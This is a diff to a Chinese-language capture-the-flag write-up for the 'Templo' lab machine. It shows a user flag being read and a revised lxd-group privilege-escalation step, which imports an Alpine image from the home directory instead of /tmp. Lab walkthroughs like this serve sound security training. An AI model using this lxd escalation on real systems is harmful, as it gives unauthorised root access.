@@ -31,12 +31,13 @@ rodgar@TheHackersLabs-Templo:~$ cat user.txt
 3e6ae8a53cc7e954a8433af59920dc7e
 ```
 
-当前用户在 lxd 组中可以利用 lxd 权限提权：
+当前用户在 lxd 组中可以利用 lxd 权限提权（不要将镜像文件保存到/tmp 目录，会提示不存在，保存到 rodgar 的 home 目录就可以）：
 
 ```
 find / -name lxc 2>/dev/null
 
-/usr/sbin/lxc image import /tmp/alpine-v3.13-x86_64-20210218_0139.tar.gz --alias lxcimage
+cd ~
+/usr/sbin/lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias lxcimage
 /usr/sbin/lxc image list
 
 /usr/sbin/lxc storage create pool dir
